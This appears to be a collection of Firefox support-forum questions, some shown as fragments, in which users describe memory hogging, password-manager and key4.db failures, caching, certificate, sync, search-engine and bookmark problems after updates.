It's gotten to the point that if I don't set EVERY SINGLE TIME I open the browser to remember password, Roboform won't work. This Roboform issue only started after this last update so I don't know what happened and all but my backup option is now no longer an option. I may sound like an old, cranky lady and, to be truthful, I am. Been using computers since late 1970's with a CP/M system and two 4"" floppy drives (well, it was really one floppy drive where I swapped out two floppies). It's not like I'm unreasonable (yes, it's okay to snicker) but these little annoyances are getting to me. I will still use Firefox over Windows, for absolutely sure. Just help me out. At least let Roboform fill the fields without my having to set privacy every single time I open the browser. Thanks. Keep up the great work. It is appreciated.

ok, some context.
Ever since I upgraded (with some lag because, yes, I did expect this, to some extent) to quantum, Firefox is regularly freezing my PC by hogging ALL of the RAM. (Win7 PC, 8GB RAM)
</p><p>I checked via taskmanager etc and usually it´s some variant of millions of javascript or scripts being loaded. For whatever reason, since most cases I am not doing anything active with it, just reading in my ao3-tab.
And the thing is, as I said, I expected some problems. The last big update before that I had similar problem, though to a lesser extent. But with a few updates that went away. Not this time.
</p><p>It appears to be fairly independent of the number of tabs opened, too. I am admittedly something of a tab-messy, so my first attempt to was to cut down to a few windows with maybe a dozen to twenty tabs in-all. I even started a with a single window and like 3 tabs. No diff. and no, no youtube there, btw. Deactivated the few addons I had on. no diff.
</p><p>I really did not want to have to google this problem, so I waited, hoping for a helpful update. and no improvements came my way. So I did look here, and yes I did have to update my graphics drivers (geforce) and yes I did deactivate the Hardware acceleration in Options - General, and yes I did tell Firefox to assume my PC is on the weak side and use ""2"" instead of the default.
To exactly no effect.
</p><p>And I keep reading, in each of these threads, that, hey, maybe the user should check which evil website is doing this, and some grumpy lizard part of my brain has by now turned into a volcano. I had my PC ""freeze"" three, hah, no, four times while I typed this here. (as in, the RAM maxxes out for periods of.. up to half an hour, during which the entire PC is best left untouched)
</p><p>Yes, I do have other windows open. No, I did not do anything with them. Are you seriously trying to tell my that the new and improved browser of the future cannot handle that? did you somehow include something that makes the browser routinely look through all its tabs and just reload them (and any potential crap-scripts) because hey shits and giggles?
</p><p>And, please, are you really telling me this new improved browser was not checked in how he deals with websites that are not made to standard??
This is the internet. This has been the internet for decades. any kind of standard being used in any kind of fashion is a niceity, a fluke almost, are you really telling me to just not browse sites that might (as has unfortunately become the norm) load something or other from other websites, be it for ads or statistics or whatever?? really????
</p><p>No I have not killed my profile yet. I have used this profile for several years, and now I actually went and got a tool to export my PW-data. Getting ready to torch it. Will update if that fixes it.
</p><p>But, really. What exactly did you do that made a functioning browser into this awful zombie? and can you please fix it. Because seriously, much as I got my rant on, the very idea of version 0.3 of the newest bestest browser reacting to uncomfortable/messy websites/content in such  manner is just absurd. As is the idea of routinely reloading every tab, no matter if it is currently needed. That would certainly be a double killer, to load all scripts/media and then do it in a way that makes it into an eternal loop of doom. please tell me it´s not like that. And please tell me when it is/might be fixed. because like this I can´t use it.

I have been a loyal Firefox user since 2008 and this is the first issue I've faced that seems near impossible to fix.

If I delete the key4.db file (I still have the key3.db and logins.json files in profile folder) everything works fine. The key4.db file is generated, my passwords are there and I can use them till next browser exit/restart. Here are the symptoms:
</p><p>- upon start the browser directly asks for master password (normally I'm asked for the master password only when I really need it)
- no browsing history is shown in the address bar
- enter key and 'Go to...' button do not work at all (I can only open a site if it is bookmarked)
- when I go to browser's options there is nothing under 'Search' section - in other words the content cannot be loaded or displayed
- when I open 'Saved Logins' dialog there is nothing 
- there are no *corrupt files in my profile directory
</p><p>So when this happens I have to exit the browser and delete the key4.db file. However if I don't access my saved logins during the session at all, there is no such problem. I can start/use/exit the browser as many times as I want and it works fine. So it looks like the access to the saved logins breaks something.

I don't want to have a whole profile on dropbox, because, there is some úproblem with syncing some locked files. I give you an example what i need, I am using Tab Session Manager for loading and backuping sessions, I am using session at home and at work too, but I don't see sessions saved at work home and opposite, ff sync just don't sync data of this addon. I have only one option, to save actual sessions before turning off firefox and export them to json, and then after starting second computer, import sessions and load them...
</p><p>And same problem I have with Thunderbird built-in calendar, at home I am using pop3 but at work imap, so I need to synchronize only calendar data, so here is sharing whole profile to dropbox is out of question.

1223268,1530012527,I am currently experiencing problems with Firefox 42.0 crashing on the Ubuntu Linux platform. (Booting from Flash Drive),"<p>I am currently experiencing problems using Firefox 42.0 on a customised Ubuntu Linux platform. The issue I am experiencing involves Firefox crashing, usually when I try to open a new page. 
</p><p>The issue is intermittent, and a temporary fix can be achieved, by restarting the OS, however, this doesn’t last more than an hour if that. The OS isn’t run from the computer hard drive, but from a flash drive provided by the company I am contracting for, as this is their policy.  
</p><p>Unfortunately, I am unable to make any changes/upgrades to the OS or browser, due to the way it is configured. 
</p><p>The technical support agent at the company I work for, has advised me that the crash is caused because by upload speed is only 0.96 Mbps, where it should be 1 Mbps. Additionally, they also advised the consistency of service for my ISP is 52% and needs to be higher. 
</p><p>My ISP has run tests on my internet connection and believe everything is working as it should be. Could the upload speed and consistency of service, cause Firefox to crash, or is it likely to be another issue?

I've been on 800 notes thousands of times and know for a fact it's a safe site. When FF blocks me I don't get an option to whilelist it or bypass the block. IE goes straight to the site with no problems. I'm 70 and not a geek so the cryptic messages FF gives me might as well be greek for all the good they do in providing information I can use.

1223341,1530047700,"after installing ff 61-x64, ff auto update changed desktop icon to x32 version 57.","<p>Automatic updates are turned off in my Firefox installation.    Today, I updated v56.0 x32 to v61.0 x64 via a full download and install.  Since I noted that the help|about menu wanted to update to v57, and v61 was available, I elected to do the full .exe download and install of v61 instead.    I selected the install option to install the background updater feature (I forget what exactly it was called), figuring that it wouldn't be active  as long as I had updates turned off in the general options.  I chose to accept the default of having icons on the desktop, shortcuts, etc.   Once the install was complete, I started v61 normally.  
</p><p>A few minutes after the successful install, I received another firefox installer UAC blank screen request for permission to update, which I approved, since I figured there were last-minute updates to v61.    The next time I started Firefox, I got version 57 per help|about, and a warning that it was out of date.   Although this version is x64, it is running in ""Program Files (x32)"" while the v61 is running in ""Program Files.""   The unexpected install of v57 down-leveled all my icons and shortcuts to point to the v57 version.   If I hadn't had the benefit of multiple firewall warnings, and known how to interpret what I was seeing, this could have been quite unpleasant.  As it is, an easy upgrade has now taken most of the afternoon.  
</p><p>Apparently what happened is that the x32 version was not deleted and  after the installer was active, it decided that the v56.0 version needed to be updated too.  If I did not have my firewall running with program controls on Firefox per .exe location, it would have been much more difficult to realize what was going on.  I'm still a little murky on how the second upgrade got kicked off, but I imagine it'll be clearer to someone who knows the internals.
</p><p>Suggested solutions:
</p><p>(1) When an x64 version is installed, the users should be prompted for disposition of the older x32 version.   Deleting of the prior version is the normal action when updating, so there should be an option to treat the upgrade to x64 the same way.
</p><p>(2) Installer should not down-level shortcuts (in my case from v61 to v57), at least not without getting user permission.
</p><p>(3) ALL facilities should honor the update settings in the firefox options.  Whatever did this update ignored the settings that I have verified in both versions to be set to ""Never Check for Updates.""    Part of this was my fault; at first I thought that the x61 version had some last minute updates needed so I told clicked to allow.
</p><p>(4) Once an instance is started, Firefox always uses that version when a shortcut is used, even if the shortcut points to a different version.  For example, if v61 is already running, and I click one of my shortcuts, a new v61 window is started.  If nothing is running when I click the same shortcut, v57 starts.  This behavior may cause additional confusion in an already murky situation.  The shortcut should either start the version it points to or issue a message that it can't be started until the other version is quit.
</p><p>(5) It appears that the ""Mozilla Maintenance Service"" is installed under the program files x32 folder, and there is a maintenance service installer log from today.  There is no maintenance service folder under program files, even though I think this is probably what I asked to have it installed.  I don't see any warning in the v61 firefox install log that installation was bypassed.   Again, it seems to me that such convolution is ripe for future issues, and the maintenance service should have been installed with v61, or at least a warning issued if that would be too complicated and it needed to be left in the program files x32 folder.  
</p><p>I believe that implementation of these suggestions would help prevent a number of similar sounding problems I have seen reported.
</p><p>I do have three related questions:
</p><p>(a) The background silent update installer that is an option during the v61 install - what does it do and will it honor ""Never Check for Updates?""  If not, how do I disable it?
</p><p>(b) What does the Tools|Options|General option ""Use background service to install updates"" do?  Does that need to be un-checked to disable silent updates, or will the ""Never Check for Updates"" option prevent its activation until I manually select an update? 
</p><p>(c) How do I get rid of the v57 version without also loosing the installer service and without having to delete both versions and loose my config?  
</p><p>If anyone is concerned about my use of the ""Never Check for Updates"" option please rest assured that I have years as a security professional and I have good reason for selecting this option.  Appropriate controls are in place.
</p><p>Thanks for your help.  It is appreciated.

If I open some website in 2 or 3 tabs then Memory usage goes upto 1-1.5 GB. It's update to the latest build 61.0. Having this problem from a long time. Even if no application is opened in the background, it takes 400-500MB. If I open 10-12 tabs then its hangs or sometimes crashes. Tried all the solutions from forum. Kindly look into the matter and revert ASAP.

</p><p>Note: I tried before, when YT changed it's UI and FF quantum was iin previous versions, to delete cookies.sqlite so that new cookies would be recreated. But that didn't helped.
</p><p>So I decided to see what is wrong with cookies.sqlite with DB brower for sqlite.
</p><p>Searched under host column for youtube and I got this line (image attached) that is a bit weird.
</p><p>Under value column there is a date 2017/10/22 (I don't know what 09-0 is). So I changed value to YES+US.en+20180605-09-0 wrote changes, copied back to profile folder and for now it is working.

If I open a tab on a livestream and start to navigate someplace else in another tab, the stream will start lagging massively. I can replicate the problem without difficulties: If I open two livestreams basically, the first will completely freeze as soon as I give the focus to the second, but if I focus an empty tab or static webpage it will come back right away, as if the first tab was so low on priority that it simply wasn't updated any longer. 
</p><p>My internet connection is clearly not a problem here (1 Gbps fiber optic, and I experience no such issues when opening even a dozen streams on Chromium) I have also tried doing the same after disabling all extensions but the problem persisted.

1223573,1530174409,How to flush removed personal certificate,"<p>I have problems removing my personal certificate from the Firefox. I I try to remove my certificate (Preferences -&gt; Privacy &amp; Security -&gt; Certificates: View Certificate) by selecting it and deleting it (pressing the Delete button), the Firefox shows that the certificate is removed (no longer installed in Firefox). But if I shortly after the removal of the certificate (e.g. several seconds) quit the Firefox and restart it again, the certificate is still present. The certificate is removed e.g. change is flushed to the cert9.db file only if the Firefox is running for a period of time.
</p><p>The question is if there is a way of forcing an immediate flush to the cert9.db file or, if there is no such way, what is the time required for Firefox to be running that the flushing of the cert9.db file takes place.

</p><p>Hi. I am developing an intranet application. We have an old asp web forms site with lots of small js and css files and also a modern part written on angular with several large resource files. 
And recently I encountered a problem with slow page opening for one of the clients that has a slow internet connection. Looks like Firefox 58 (we cannot upgrade immediately due to security concerns) stops using some cached resources and starts requesting them from the server. If I clear all cached files for several minutes everything is good, all files are reported as 304 and are taken from cache and page loads in several seconds. We have cache control headers set to Public, Expired in 2024 and MaxAge 30 days. But 5 minutes later the picture changes - several files begin to be requested each time without etag header and modified date resulting a full download. I tried increasing cache size to 1GB, adding immutable to max age but none of that changed the behavior. I can see all the files in about:cache but stil Firefox doesn't use them.
Is the any way to diagnose the problem or any known solution?

1223590,1530184820,Sometimes static resource files stop beeing cached despite cache control headers,"<p>Hi. I am developing an intranet application. An recently we encountered a very slow page opening at one of our clients in a remote location with slow internet access. The problem seems to be related to that some files stop been cached despite cache control headers. We are using Firefox 58 and cannot quickly upgrade to a newer version due to security concerns. 
When I clear browser cache everything is good. We have cache control headers set to Public, Expired in 2024 and MaxAge for 30 days. All js and css files are reported 304, taken from cache and page loads within several seconds. But several minutes later some files begin to be downloaded again with each page refresh. We have and an old asp web forms app with lots of small js and css resources as well a new part that is rewritten with angular and assembled in a few large minified files. The problem happens to a random set of those and due to slow connection load time increases dramatically. I can see all the files on about:cache page but nevertheless they are requested without Etag match or Last modified date and so server responses with full content. 
I tried to increase cache size up to 1GB without smart managing, adding immutable to max age. But nothing changes the behavior.
Is there any way to diagnose the problem or any known solution?

What the number is exactly, however, does not matter except for the fact that THE NUMBER IS NOT ZERO!!!

Because I can open Firefox, clear the ""Cookies and Site Data"" so the number goes to zero, then close Firefox without ever going to a website. Then, open Firefox again, and guess what? THE NUMBER IS NOT ZERO ANYMORE.
</p><p>So, would someone please give me a fix that does not involve cleaning the f'ing cache every time I go to a new website.

</p><p>I know this is a sore point with add ons and ""compatibility"" with sites etc.
</p><p>So, here is where I am at:
I have FF installed and not too many add ons installed.
</p><p>This problem  has recently happened with no input from me to cause it.
</p><p>When I go to my bank's home page there are two fields to be entered.
1 - who I am
2 - my password
</p><p>New tab, no previous log in:  All good.
If I log in, and log out, then try to log back in is where the problem happens.
(Yes, I know:  who would do that?  But this is just me forcing the problem to happen.)
</p><p>I click in the first field and enter who I am.
Then, I can either move the mouse and click on the second field or press &lt;TAB&gt; to get to it.
Either way the first field is WIPED CLEAR.
</p><p>Granted doing it with all add ons disabled it works.
</p><p>But it brings me to my real question about:  ""How do I get from having ALL of them disabled to enabling them one at a time to see which one is causing the problem?""
</p><p>It would be nice if there was a way that when you select ""Start with all add ons disabled"" you can go to about:addons and enable them one at a time.
</p><p>This would help a lot of people to find out what is going on and report bugs to the people who make the add ons.

So I began using Firefox more than Chrome, after getting my Windows 10 I forgot Unity existed. I installed Opera and I loved it, as it stands Opera is one of THE BEST browsers available. Nowadays it's proven that If you don't use Chrome or Opera, you're using a terrible browser. NO OTHER BROWSER is as useful as those two, Firefox was useful because it ran Unity. But now it doesn't appear that Firefox does, making it as useless as Internet explorer. I was told that Firefox 45 should still run Unity, so I went to try and download it(from the official site). But when installing it simply installed the most recent version that I couldn't care less for, this is upsetting and If Firefox will no longer support Unity I will NEVER use it again. Edge and Internet Explorer exist so it's not like i'm desperate for another browser, besides Chrome and Opera do almost everything I could ever need a browser to do...

</p><p>Reading long articles and navigating back and forth to references is currently not possible, unless I open every link in new tab/window without leaving the original page.
</p><p>Chrome and Vivaldi don't exhibit such behavior, going back in history brings me to the vertical scroll position of where I left. I also *think* in old Firefox the behavior was consistent with Chrome.

If you enter <a href=""https://en.wikipedia.org/wiki/Firefox#See_also"" rel=""nofollow"">https://en.wikipedia.org/wiki/Firefox#See_also</a> into new tab, you are correctly moved to ""See also"" section.

Once a download file is flagged as containing malware there is a bug in Firefox.  The only options offered by Firefox are ""REMOVE FILE"" or ""OPEN"".  ""OPEN"" should not be an option at this point.  The options should be ""DOWNLOAD ANYWAY"" or ""REMOVE FILE"".  With the current options and an .exe file (if downloaded) will be immediately executed resulting in infection if the file is tainted.  With my suggested options, If a user chooses to ""DOWNLOAD ANYWAY"" then Firefox should remind the user the file may be infected and should recommend that the file be scanned by the user's antivirus/malware software before opening.

</p><p>I am developing a web service using REST API. This REST API is running on port 6443 for HTTPS.
Client is going to be a Single page application running on port 443 for HTTPS on same machine.
The problem I am facing is:
</p><p>While I hit the url say:  <a href=""https://mymachine.com/new_ui"" rel=""nofollow"">https://mymachine.com/new_ui</a>
I get certificate exception for an invalid certificate because I use a self signed one, so <a href=""http://mymachine.com:443"" rel=""nofollow"">mymachine.com:443</a> gets added to server exception. But still requests doen't go to REST API as they are running on <a href=""https://mymachine.com:6443/restservice"" rel=""nofollow"">https://mymachine.com:6443/restservice</a>.
If I manually add <a href=""http://mymachine.com:6443"" rel=""nofollow"">mymachine.com:6443</a> to server exception on firefox it works but it will not be the case in production for customers.
</p><p>Some options that I thought are:
1. Give another pop up and ask to add REST server on port 6443 exception too. 
</p><pre>   But this doesn't look proper as why an end user should accept the cerf for same domain twice.
   Also REST api server port can change. 
</pre>
<p>2. Can we programmatically add exception for domain and both the ports in one shot? Ofcourse with the consent of the user.
3. Use a reverse proxy. But then its going to have memory footprint on our system. Also it will be time consuming.
</p><p>Please suggest some options. How do I deal with it.

</p><p>Notice the &amp;client=firefox-b-ab at the end. If I take that off the end of the URL then it searches as it should do with Google however with me not changing the URL (which happens automatically as soon as I type something in to search) then it redirects to Yahoo which leads me to believe that Google is redirecting Firefox based upon the fact that it is Firefox?
</p><p>Why they would do that is utterly beyond me though?
</p><p>Thanks for any help with this as I'd really love to be able to get back to having Google as my default search engine again as soon as possible.

</p><p>I found an article that explained that the bookmarks are saved in the database file places.sqlite so I used an sqlite editor to search &amp; replace the url in the moz_places table » url field. That part worked great, all these bookmarks in Firefox now have the correct url.

1224035,1530465989,Updated  version of Firefox is not compatible with my Windows 10 PC,"<p>Hello.  I have a Windows 10 64-bit PC and have been using Mozilla Firefox as my primary internet browser.  I have made sure that my Firefox is up-to-date under the Options Menu.  I have defragmented and optimized my system.  I use Avast anti-virus and Cleanup Premium and have scanned the system for Malware or Viruses.  The problem is that Firefox does not seem to be compatible with Windows at all.  I get frequent system hangups and stalls with messages displayed across the screen in a yellow bar that reads, ""This web page is slowing down your browser"".  Two choices are given and neither choice ends the hang up:  Stop Script or Wait.  This doesn't just happen on one website.  It happens throughout the day.  If I have been using the computer, then leave the house for a few hours and come back, I come back to a completely locked up screen.  The system gets slower and slower and slower as it is used throughout the day.  Sometimes, my screen turns completely black and wiggling my mouse or hitting a key on the keyboard doesn't wake it up.  I have to do the Control-Alt-Delete thing five or six times to wake it back up and Sign Out and Sign Back In.  Then, all is back to normal for a while.  I have uninstalled and reinstalled Firefox with no improvement.  It doesn't seem to happen with other browsers; however, I have always liked the option of keeping my Toolbar at the top of my screen with Bookmarks where I can alphabetize my bookmarked webpages and stick them in alphabetically-arranged folders, etc.  You can't organize your bookmarks or favorites as well using other browsers.  You get stuck with a non-alphabetical list, stupid stars, etc.  I hate all other options.  It is MUCH MORE efficient this old way.  I would like to keep using Firefox, but this cannot continue.  Is there any other advice that you can offer that I have not tried to stop these stalls and hangups?

1224037,1530466501,"New printer gets a code 30, ""printer not activated"" driver installation is good","<p>I have uninstalled all software and support stuff for an HP printer and set up Epson Workforce 3720 successfully. Driver and preferences are successful. Print test is good. However, I am unable to print due to code 30 ""printer not activated"". All I can find online is that Firefox sometimes has Code 30 because of Epson incompatibility? Suggestion is to switch to Internet Explorer whenever I want to print. Is that really necessary and, if so, how to I do it. I really need to get some documents printed.

The banner is a yellow bar across the top of my desktop. Clicking either ""stop program"" or ""wait"" does nothing.

I cannot use Quantum if I cannot reach that site. Problem is unlikely to be the (Windows 7 Pro) firewall or the security software--has happened both with McAfee suite and Avast (free)--also running Malwarebytes in both setups.

1224041,1530469859,removed search engines keep coming back,"<p>Search engines that I removed from my list of one-click search engines (in the Firefox options) reappear after a month or so.  This has happened a couple of times already.  I suspect that the reappearance is triggered by a Firefox update, but am not sure about that.  The search engines that I keep removing and that keep reappearing after a while are
- Bing
- <a href=""http://bol.com"" rel=""nofollow"">bol.com</a>
- <a href=""http://Marktplaats.nl"" rel=""nofollow"">Marktplaats.nl</a>
</p><p>I'm using Firefox on Windows 10 Home, with Dutch regional settings.  I cannot find evidence of having (unwittingly) installed any Windows applications or Firefox extensions or plugins associated with these search engines (except that Bing is a Microsoft product and might be integrated into the operating system).  Neither ""<a href=""http://bol.com"" rel=""nofollow"">bol.com</a>"" nor ""marktplaats"" occur in my Windows registry.
</p><p>What is causing these search engines to keep reappearing?  How can I prevent them from reappearing?  I notice an option in the ""General"" section of Firefox options whose description (translated to English) is ""Update search engines automatically"".  Is that the reason for the unwanted search engines reappearing?  I figured that that option meant ""update the search engines from your list automatically"" and would not install search engines that aren't currently in my list.

All I have is the sessionstore-backups folder, and it's empty.
I don't have my firefox saving browser history, but I know it can create sessionstore.js anyway, because it does on a different computer of mine.

</p><p>However, ever since ""quantum upgrade"" (I'll try to close my eyes to some previous botched jobs) and removal of support for the above add-ons, Firefox simply SUCKS!

Since it unsynced the device (Mac), it took over entire history from my Surface and now there's no way for me to find all tabs that used to be there and NO OPTION TO RESTORE THEM! I am devastated and deeply disappointed by Firefox developers allowing it to become this bad, like they don't realise that this is one of the most important aspect of a browser nowadays - aspect THEY introduced and because of which I refused to switch to Chrome for years!

</p><p>I am a keyboard junkie - and on my Mac with Firefox the delete shortcut (""#"") does no longer work. It's the ONLY shortcut that stopped working. I can do anything else - I can navigate, move mails, go forward and back, write mails, etc - I just cannot delete any more.
</p><p>If I hit CMD-F and hit ""#"" it appears in the search box. I can enter it in the location bar. I can enter it in the search bar in GMail. I can enter it on any web page, I can use it just as before - it just has absolutely no effect in GMail. It does not work in the old AND the new GMail UI.
</p><p>It works in Chrome, though. But I love Firefox, and I will not switch to Chrome. And it should just work, IMHO ;) . I really don't get it.
</p><p>Things I've tried:
</p>
<ul><li> stopped pretty much ANY running tool
</li><li> restarted firefox with addons disabled
</li><li> cleaned out Firefox (shift-CMD-backspace, select ""All"", go)
</li></ul>
<p>Nothing helped.

On my desktop, if I use the Google Chrome browser, I also do not have a problem opening my e-mail.

(September 5, 2018)","<p>I know this question has already been asked on the Mozilla Support Forums, but it's always better for there to be multiple answers to questions about Firefox since there's two sides to every story. I still am very much looking forward to reinstalling Firefox Stable on my 15.6"" full HD Dell Inspiron 7558 after I reset it and cleaned the drive a few days ago after numerous bug reports being sent to Mozilla and Microsoft about Firefox and Windows 10 build 17134, respectively. I'm also looking forward to the complete rollout of all of the major improvements to loading webpages in Firefox Stable, to be completed by Tuesday, January 29, 2019 when Firefox 65.0 Stable gets released to Windows, macOS, Linux, and Android. At that point in time, I'll be able to read and bookmark articles seamlessly and with much greater reliability than I do here today, September 5, 2018! Lastly, I'm very much looking forward to each and every one of the planned reliability improvements and new features coming in the Windows 10 October 2018 update which will be released next month. I always love Microsoft's concerted efforts to act upon the bug reports users worldwide send to Microsoft to make Windows better every second Tuesday of every month and when a new build of Windows 10 is released about once every six months! I'll comment on how Firefox Stable is working for me on my Dell Inspiron 7558 every four weeks beginning October 30. I'll also donate $5.00 to Mozilla every first and fifteenth of each month to ensure I always get timely updates to the bugs in Firefox Stable. Now more than ever, it's very important my experience with Firefox Stable, my much preferred web browser, is as seamless and reliable as it can be every day when I read all kinds of articles on the World Wide Web, especially about what there is to explore in the United States, Canada, and Mexico! My sister very much enjoyed Cancun after she became a registered nurse and I expect to have a substantially similar experience with her once I find a career that I very much enjoy working to help, not just support myself!
</p><p>I know I threw a lot at you this morning. This long description of how I feel at 10:26 AM EDT is evidence that I'm very compassionate about the active development of Firefox. On top of a $5.00 donation every first and fifteenth of each month, I might become a beta tester of Firefox and report any performance issue, real or perceived, to Mozilla as soon as I take notice of any that may be present!

I'm familiar with the fixes and have tried most. Private browsing seems to work best but I constantly have to reset options like graphs I use so that's a pain. If I zoom my screen in to say 80% some graphics wont load on a few webpages as well.
I was just reading about the issue in this support forum. Following on a point made I clicked the task manager tab (already opened) and for a sec it flashed ""81%"" ???? I tried it a few times with similar results.
I reduced the window to about 80% of the screen and put task manager on the side with a google search page and this tab open. Extensions,only adblocker plus.
</p><p>Just scrolling up/down this page causes the 2 FF background processes to go from near 0 up to 16 &amp; 18 (about) If I scroll up/down real fast I can get it to 100%. MPC-HC in the background is also causing Firefox CPU to be higher! If I pause music &amp; do nothing the FF processes all go down to 3 or to 0.

With Firefox closed, I went to open it and it took ages to open fully.  When it did open, the familiar toolbars were there, including my Bookmarks toolbar.  The Bookmarks toolbar is showing the icons of sites that I have put there, and it is showing my self-created folders on it (containing various website shortcuts etc).  The only difference is that the folders are grey instead of yellow. However, nothing is actually HAPPENING. No matter what I click on, I am not reaching any website whatsoever. I cannot actually go anywhere at all with Firefox.  My internet connection is working just fine.  I can open email software and I can open (and use) Internet Explorer.

(see uploaded images) Frankly, I don't see the logic of it, but who knows why you guys do the things you do sometimes. However, it has obviously increased the size of the dialog box. Consequently, when I expand the menu to ""choose"" folders and such, the entire thing is running off the bottom of my screen and it does this because I have to use the Windows magnifier, and I have it locked to the task bar and so this ""screenshot"" that is now attached to the bookmark menu dialog box is pretty much cut-off as well while at the bottom I can barely view any of my folders.
</p><p>Even though I think it's a silly idea, it probably works fine for those who don't have to use the Windows magnifier, but for me--it's irritating and I wish to know how I can go in and remove the feature, plese.
</p><p>Also, since you have moved the majority of the Menu bar features into the hamburger menu--why have you not yet moved the ""view"" tab into the hamburger menu as well? I use it quite a bit, being visually handicap ed and I wouldn't mind it much if you would include it in the hamburger menu as well so I don't have to keep opening the Menu bar just to use the View tab.

Upon upgraded to Firefox Ver. 60.2.0esr (32-bit) yesterday, however, I can not find where they are any more.

Since I have been saving HTML backup files regularly, I tried to follow that procedure to make a new backup and it did get saved to my H/D with the content organized like all the earlier ones. I tried to import one of the earlier backups. It seemed to work. Yet, I could not find where did it go afterwards.
I do find some single level / linear listings of many URLs of sites that I visited previously under ""Other Bookmarks"". Most of them were a long time ago (I can even remember the subject.). Although I spotted some that are fairly recent (within the past month). But, surprisingly, one has triple identical entries. This is very puzzling.
Please provide some guidance.

It occurs with both a USB kbd and a wireless kbd.  Only CTRL held down continuously reduces the window Zoom.  No other key needs to be pressed.  Thus, can't use CTRL-+ to restore zoom, though I can click in address bar or use Zoom in the hamburger menu.  Another thing that happens is when a Print box gets to the point where it displays the printer name, it cycles rapidly through the list of printers, and it is impossible to change back to any other than the last on the list.  It's behaving as if some key were chronically on, but it is the same with the two different kbds.  Things work fine in Microsoft applications.  Just upgraded today to 62.0.  Tried re-loading the installer and doing a fresh install, as well as trying the Refresh suggested in Troubleshooting, but neither of these produced any change.  It's as if some kind of crazy kbd shortcut was installed without my knowing it, but I can't find anything that seems that it would behave this way.
Sorry, but there's no screen shot that can show this thing.

I don't like pocket, I don't trust its terms of service/privacy policy, I don't like that Firefox/Mozilla has chosen to basically make it a first-class citizen even though it doesn't put my interests first and foremost. I don't like that Firefox has basically decided to say ""whatever Google does, we will follow"". I don't like that Firefox/Mozilla has abandoned its view of ""what is best for the browser user"", and gone to ""whatever is best for the website"".
</p><p>Ideally, I would like to have ESR 52.9, as well as ESR 60.X, side-by-side. I would use 52 for 99% of what I do, and only switch to 60 for those sites that simply will not work at all in 52.

This is BAD. Of course I suppose I can manually delete ""www."" from the 'location' fields of all my bookmark and remember to save all new bookmarks in the future without the 'www.', but if this is a bug, then I would like to wait for it to be fixed. If it's a changed behavior, I find that including 'www.' in the search behavior doesn't make sense at all.

If the Firefox team prides itself on delivering a fast and user-friendly browser, why can't it allow users to configure tabs :
</p><p>-where they are created (at the end, at the beginning, right next to the actual tab, on the right or left of the actual tab)
-whether a new tab can be created with a double click on the titlebar, or right-clicking the titlebar or an existing tab
-whether we want a list of followed tabs and/or history or not
-to show only right-menu options for tab-management that I need / want OR to add menu options I'd like for tab-management

</p><p>As you probably also know, Firefox 52 was the last version to support non-WebExtension addons, several of which I rely upon heavily for my work, such as Scrapbook.
</p><p>If your first reaction to that last statement ISN'T to suspect I haven't tried to find an alternative, then you can skip this paragraph. Otherwise read on. I have been searching for and evaluating alternatives ever since I heard for the first time that Scrapbook's days were numbered, but none of them offer adequate functionality. In order to work efficiently, I need to be able to archive and manage web pages, PDF files, images, MS Word files, notes and more in a folder tree structure directly within the browser UI, view archived content without an internet connection, use highlighting and commenting functions, use full-text search functions, and so on. In a nutshell, I need Scrapbook. If after reading this you still think there is a viable alternative that I missed, then I'm all ears.
</p><p>Doing without Scrapbook is not an option, but on the other hand, neither is surfing the web with what will soon be an outdated browser riddled with security flaws.
</p><p>For this reason, I decided to try a workaround that I read about some time ago: installing the 32-bit version of Firefox 52 ESR alongside the latest 64-bit version of the browser side-by-side, and using a different user profile for each. The idea was to use the up-to-date version of the browser for normal surfing, and to revert to the old version whenever it was necessary to use scrapbook.
</p><p>Well, at least it sounded good on paper. In practice I'm finding that using two different user profiles is by no means a guarantee that the two Firefox instances won't interfere with each other. I create a bookmark on the bookmarks toolbar in one instance; it shows up in the other instance. I delete it in one instance; it disappears in the other. Not even using the command line options -P ""Profile Name""  or -no-remote are helping.
</p><p>I really need to find a solution for this and any help would be greatly appreciated. Here are my questions summarized:
</p><p>1) Is there an alternative to Scrapbook that provides at least 90% of the same functionality? 
</p><p>2) Is there a way to have two versions of Firefox installed - 52 ESR 32-bit AND whatever the latest and greatest 64-bit is - and keep them completely separate from each other?
</p><p>3) Is there something else I'm missing?

</p><p>Not only that, manually installing the old version and trying to grab old data back, has proven useless, as the addon is disabled there, too for some reason. I can't even see if restarting would work because it automatically updates to 60 ESR regardless of the option set to not update.

</p><p>After the last problem, reported here under two (2) entries - lost all favicons in the upgrades from 60 to 61, got to a point where I couldn't even delete any bookmarks, so I uninstalled Firefox completely, every trace, including bookmarks.

</p><p>Since the problems in 60 and 61, I now approach my bookmarks differently, I removed almost 3000 business bookmarks and now have them in a Word file, kept about 1000 active in FF.
</p><p>When I set up FF62 and imported from file, all my favicons were there in both sandboxed and unsandboxed Firefox (I use Sandboxie).
</p><p>Booted up this morning, all favicons are gone again, every single one of them.
</p><p>I have no issues with bookmark favicons in Portable Firefox, Slimjet (Chrome) or Waterfox - they all have identical counts and all favicons are present - just desktop Firefox and just since FF60.
</p><p>I have no issues with any of those browsers either sandboxed or unsandboxed either.

1232615,1536297706,What guarantees of accountability and transparency exist in Mozilla's phishing and malware protections to prevent false positives?,"<p>A site of mine has been blocked ""because it may trick you into doing something dangerous"" etc.  The phrasing suggests that you aren't even sure if there is a real problem, but you're blocking it just in case. Nowhere is the cause specified. There are no details of what behaviour or code on the site caused it to be listed, or who listed it, or why. Just a big message saying that this is a Deceptive Site. There's no one I can talk to about this, no way to find out any information whatsoever - there's not even any notification that the site has been blocked. All of which makes it just about impossible to actually FIX whatever is causing this issue (assuming that there is one, and I haven't just been reported randomly by some troll).
</p><p>So, to sum up: there's no useful information, no transparency and no accountability anywhere in this process. Just Google throwing their weight around and you letting them.
</p><p>I'm not saying that there is no problem - there may be a legitimate issue that needs addressing. What I'm saying is that the way the Mozilla Foundation has dealt with the problem makes it more or less impossible to actually do that addressing. Who exactly does that help? How does this make anyone's internet experience better?

Still after a few days FF slows down. The last time I decided to restart FF I clicked on File and waited 17 minutes for the drop down menu that let me click on Exit. 23 minutes later FF crashed. So whatever is going on in the background has to be involved with why this is happening. The FF interface by the way had been closed for about 20 minutes before I got the crash notice. This is not about running MBAM,buying a new machine or upgrading to the ESR. to fix the problem. It's academic. i want to know why because all the recommendations to upgrade in the past have not improved the situation and recent upgrades made things worse. I will be doing the ESR upgrade in time but I want to be able to launch this version as well perhaps as a different user.

